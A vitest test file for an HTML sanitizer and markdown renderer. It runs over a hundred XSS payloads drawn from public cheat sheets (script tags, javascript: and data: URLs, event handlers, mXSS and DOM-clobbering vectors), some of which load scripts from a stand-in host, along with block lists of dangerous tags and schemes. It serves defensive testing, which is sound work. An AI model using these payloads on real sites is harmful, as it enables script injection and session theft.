import { describe, expect, it } from 'vitest';
import { Parser } from 'htmlparser2';
import { parseFragment } from 'parse5';
import { renderChangelog, renderMarkdown, sanitizeHtml } from '../src/index.ts';

const ctx = { fullName: 'octo/mod', commit: 'a'.repeat(40), docPath: 'README.md' };

const BROWSER_ALLOWED = new Set([
  'a', 'abbr', 'b', 'bdi', 'bdo', 'big', 'blockquote', 'br', 'caption', 'center', 'cite', 'code', 'col', 'colgroup',
  'dd', 'del', 'details', 'dfn', 'div', 'dl', 'dt', 'em', 'figcaption', 'figure', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'hr', 'i', 'img', 'input', 'ins', 'kbd', 'li', 'mark', 'ol', 'p', 'picture', 'pre', 'q', 'rp', 'rt', 'ruby', 's',
  'samp', 'section', 'small', 'source', 'span', 'strike', 'strong', 'sub', 'summary', 'sup', 'table', 'tbody', 'td',
  'tfoot', 'th', 'thead', 'tr', 'tt', 'u', 'ul', 'var', 'wbr',
]);

interface P5Node { nodeName: string; tagName?: string; attrs?: { name: string; value: string }[]; childNodes?: P5Node[]; namespaceURI?: string }

/** Re-parse with a spec-compliant HTML5 parser (what a browser does) and walk the tree. */
function browserCheck(html: string): string[] {
  const problems: string[] = [];
  const walk = (n: P5Node) => {
    if (n.tagName) {
      if (!BROWSER_ALLOWED.has(n.tagName)) problems.push(`browser sees <${n.tagName}>`);
      if (n.namespaceURI && n.namespaceURI !== 'http://www.w3.org/1999/xhtml') problems.push(`foreign content ${n.tagName}`);
      for (const a of n.attrs ?? []) {
        if (/^on/i.test(a.name) || a.name === 'style' || a.name === 'srcdoc') problems.push(`browser sees attr ${a.name}`);
        const v = a.value.replace(/[\u0000-\u0020]/g, '').toLowerCase();
        if (['href', 'src', 'srcset'].includes(a.name) && /^(javascript|vbscript|file|data:text)/.test(v)) problems.push(`browser sees url ${a.value}`);
      }
    }
    if (n.nodeName === '#comment') problems.push('comment');
    for (const c of n.childNodes ?? []) walk(c);
  };
  walk(parseFragment(html) as unknown as P5Node);
  return problems;
}

/** Parse our output and assert nothing executable survived. */
function assertSafe(html: string): void {
  expect(browserCheck(html), html).toEqual([]);
  const problems: string[] = [];
  const parser = new Parser(
    {
      onopentag(name, attrs) {
        if (['script', 'style', 'iframe', 'object', 'embed', 'form', 'svg', 'math', 'base', 'meta', 'link', 'frame', 'frameset', 'textarea', 'noscript', 'template', 'xmp', 'button', 'video', 'audio'].includes(name))
          problems.push(`tag ${name}`);
        for (const [k, v] of Object.entries(attrs)) {
          if (/^on/i.test(k)) problems.push(`attr ${k}`);
          if (k === 'style' || k === 'formaction' || k === 'action' || k === 'xlink:href' || k === 'srcdoc') problems.push(`attr ${k}`);
          const norm = v.replace(/[\u0000-\u0020]/g, '').toLowerCase();
          if (['href', 'src', 'srcset', 'action', 'background', 'poster', 'cite', 'data'].includes(k)) {
            if (/^(javascript|vbscript|file|blob|filesystem):/.test(norm)) problems.push(`url ${k}=${v}`);
            if (norm.startsWith('data:') && !(k === 'src' && /^data:image\/(png|jpe?g|gif|webp|avif);base64,/.test(norm)))
              problems.push(`data url ${k}`);
          }
        }
      },
    },
    { decodeEntities: true },
  );
  parser.write(html);
  parser.end();
  expect(problems, html).toEqual([]);
  // Raw-text escapes must never appear unescaped.
  expect(html).not.toMatch(/<\/?(script|style|iframe|svg|math)\b/i);
}

// Payloads drawn from the OWASP XSS filter evasion cheat sheet, PortSwigger XSS cheat sheet,
// DOMPurify / html5sec mXSS test cases and markdown-specific vectors.
const PAYLOADS: string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=javascript:alert(\'XSS\')>',
  '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  '<a onmouseover="alert(document.cookie)">xxs link</a>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>',
  '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
  '<IMG SRC=# onmouseover="alert(\'xxs\')">',
  '<IMG SRC= onmouseover="alert(\'xxs\')">',
  '<IMG onmouseover="alert(\'xxs\')">',
  '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
  '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
  '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
  '<IMG SRC="jav\tascript:alert(\'XSS\');">',
  '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
  '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
  '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
  '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
  '<a href=" &#14;  javascript:alert(\'XSS\');">x</a>',
  '<a href="&#1;javascript:alert(1)">x</a>',
  '<a href="java&Tab;script:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="JAVASCRIPT:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="file:///etc/passwd">x</a>',
  '<SCRIPT/XSS SRC="https://xss.example/xss.js"></SCRIPT>',
  '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
  '<SCRIPT/SRC="https://xss.example/xss.js"></SCRIPT>',
  '<<SCRIPT>alert("XSS");//\\<</SCRIPT>',
  '<SCRIPT SRC=https://xss.example/xss.js?< B >',
  '<SCRIPT SRC=//xss.example/.j>',
  '<IMG SRC="`<javascript:alert>`(\'XSS\')"',
  '<iframe src=https://xss.example/scriptlet.html <',
  '\\";alert(\'XSS\');//',
  '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
  '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
  '<input type="checkbox" onfocus="alert(1)" autofocus>',
  '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
  '<IMG DYNSRC="javascript:alert(\'XSS\')">',
  '<IMG LOWSRC="javascript:alert(\'XSS\')">',
  '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
  '<svg/onload=alert(\'XSS\')>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>',
  '<math><mi xlink:href="data:x,<script>alert(4)</script>">',
  '<BGSOUND SRC="javascript:alert(\'XSS\');">',
  '<BR SIZE="&{alert(\'XSS\')}">',
  '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  '<STYLE>@import\'https://xss.example/xss.css\';</STYLE>',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
  '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
  '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
  '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
  '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
  '<DIV STYLE="width: expression(alert(\'XSS\'));">',
  '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
  '<BASE HREF="javascript:alert(\'XSS\');//">',
  '<OBJECT TYPE="text/x-scriptlet" DATA="https://xss.example/scriptlet.html"></OBJECT>',
  '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<isindex type=image src=1 onerror=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<details/open/ontoggle=alert(1)>',
  '<a href="https://ok.example" onclick="alert(1)">ok</a>',
  '<img src="x" alt="&quot; onerror=&quot;alert(1)">',
  '<img src="x` `<script>alert(1)</script>"` `>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
  '<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>',
  '<template><script>alert(1)</script></template>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<title><img src=x onerror=alert(1)></title>',
  '<style><img src=x onerror=alert(1)></style>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)> -->',
  '<![CDATA[><img src=x onerror=alert(1)>]]>',
  '<?xml version="1.0"?><img src=x onerror=alert(1)>',
  '<a href="#" id="x" name="getElementById">clobber</a>',
  '<img name="cookie" src="x">',
  '<form id="test"><input id="attributes"></form>',
  '<picture><source srcset="javascript:alert(1)"><img src="x"></picture>',
  '<img srcset="javascript:alert(1) 1x, https://ok.example/a.png 2x">',
  '<source src="javascript:alert(1)">',
  '<video><source onerror="alert(1)"></video>',
  '<audio src=x onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<div onpointerover="alert(1)">x</div>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6a;avascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="\x00javascript:alert(1)">x</a>',
  '<a href="javascript\x00:alert(1)">x</a>',
  '<img src="data:text/html,<script>alert(1)</script>">',
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  '<a href="data:image/png;base64,iVBORw0KGgo=">png link</a>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>',
  '<p class="site-header" align="javascript:alert(1)">x</p>',
  '<img width="100 onerror=alert(1)" src="x">',
  '<table><tr><td colspan="1 onclick=alert(1)">x</td></tr></table>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<sCrIpT>alert(1)</ScRiPt>',
  '<script\n>alert(1)</script\n>',
  '<img src=x:alert(alt) onerror=eval(src) alt=0>',
  '<a href="https://ok.example/" target="_self" rel="opener">x</a>',
  '</div></div></main><script>alert(1)</script>',
  '<div><p>unclosed <b>bold',
];

const MD_PAYLOADS: string[] = [
  '[x](javascript:alert(1))',
  '[x](JAVASCRIPT:alert(1))',
  '[x](javascript&#58;alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x]( javascript:alert(1))',
  '![x](javascript:alert(1))',
  '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[x][ref]\n\n[ref]: javascript:alert(1)',
  '<javascript:alert(1)>',
  '[a](vbscript:msgbox)',
  '[a](file:///etc/passwd)',
  '```html\n<script>alert(1)</script>\n```',
  '`<script>alert(1)</script>`',
  '<details><summary>x</summary>\n\n<script>alert(1)</script>\n\n</details>',
  '# <img src=x onerror=alert(1)>',
  '| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | <script>alert(1)</script> |',
  '- [ ] <img src=x onerror=alert(1)>',
  '> [!NOTE]\n> <script>alert(1)</script>',
  'x[^1]\n\n[^1]: <img src=x onerror=alert(1)>',
  '<div\nonclick="alert(1)">multi-line raw html</div>',
  '[![b](https://img.example/b.svg)](javascript:alert(1))',
  '<a href="javascript:alert(1)">[x](https://ok.example)</a>',
];

describe('sanitizeHtml: XSS payloads', () => {
  for (const p of PAYLOADS) {
    it(p.slice(0, 80), () => {
      const out = sanitizeHtml(p);
      assertSafe(out);
      // Attribute values are escaped/quoted; strip them before looking for injected attributes.
      expect(out.replace(/"[^"]*"/g, '""')).not.toMatch(/\son[a-z]+\s*=/i);
    });
  }
});

describe('renderMarkdown: XSS payloads', () => {
  for (const p of [...PAYLOADS, ...MD_PAYLOADS]) {
    it(p.slice(0, 80), () => {
      const { html } = renderMarkdown(p, ctx);
      assertSafe(html);
      const tags = html.match(/<[a-z][^>]*>/gi) ?? [];
      for (const t of tags) expect(t.replace(/"[^"]*"/g, '""')).not.toMatch(/\son[a-z]+\s*=/i);
      expect(html).not.toMatch(/href="\s*(javascript|vbscript|data|file):/i);
      expect(html).not.toMatch(/src="\s*(javascript|vbscript|file):/i);
      expect(renderChangelog(p, ctx)).not.toMatch(/<script/i);
      assertSafe(renderChangelog(p, { ...ctx, remoteImages: 'link' }));
      assertSafe(renderMarkdown(p, { ...ctx, remoteImages: 'link', resolveImage: (u) => (u.length % 2 ? '/assets/0123456789abcdef.png' : null) }).html);
    });
  }
});

describe('structure', () => {
  it('output is balanced and cannot close the host container', () => {
    const out = sanitizeHtml('</div></div></article><div><p>a<b>b');
    expect(out).toBe('<div><p>a<b>b</b></p></div>');
  });

  it('drops comments, raw text elements and their content', () => {
    expect(sanitizeHtml('a<!-- c --><style>x{}</style><script>y</script>b')).toBe('ab');
  });

  it('escapes text and attributes on re-serialization', () => {
    expect(sanitizeHtml('<p title="a&quot;b<c>">1 &lt; 2 &amp;&gt;</p>')).toBe('<p title="a&quot;b&lt;c&gt;">1 &lt; 2 &amp;&gt;</p>');
  });

  it('unwraps unknown tags but keeps text', () => {
    expect(sanitizeHtml('<font color=red>hi</font><custom-el x=1>there</custom-el>')).toBe('hihi'.slice(0, 2) + 'there');
  });

  it('prefixes ids and fragment links (anti DOM clobbering)', () => {
    expect(sanitizeHtml('<h2 id="install">x</h2><a href="#install">go</a><a name="top"></a>')).toBe(
      '<h2 id="user-content-install">x</h2><a href="#user-content-install">go</a><a name="user-content-top"></a>',
    );
  });

  it('keeps only whitelisted classes', () => {
    expect(sanitizeHtml('<div class="markdown-alert evil header">x</div><code class="language-js">y</code>')).toBe(
      '<div class="markdown-alert">x</div><code class="language-js">y</code>',
    );
  });

  it('adds rel and target to external links only', () => {
    expect(sanitizeHtml('<a href="https://x.example/">x</a>')).toBe(
      '<a href="https://x.example/" rel="nofollow noopener noreferrer" target="_blank">x</a>',
    );
    expect(sanitizeHtml('<a href="#a">x</a>')).toBe('<a href="#user-content-a">x</a>');
  });

  it('allows data: images only with raster image MIME', () => {
    expect(sanitizeHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(sanitizeHtml('<img src="data:image/svg+xml;base64,PHN2Zz4=">')).not.toContain('<img');
  });

  it('allows layout tags used by READMEs', () => {
    const html =
      '<div align="center"><p align="center"><picture><source media="(prefers-color-scheme: dark)" srcset="https://a.example/d.png"><img src="https://a.example/l.png" alt="logo" width="200"></picture></p><details open><summary>More</summary><kbd>Ctrl</kbd><br></details></div>';
    const out = sanitizeHtml(html);
    expect(out).toContain('<div align="center"><p align="center"><picture><source media="(prefers-color-scheme: dark)" srcset="https://a.example/d.png">');
    expect(out).toContain('alt="logo" width="200"');
    expect(out).toContain('<details open><summary>More</summary><kbd>Ctrl</kbd><br></details>');
  });
});
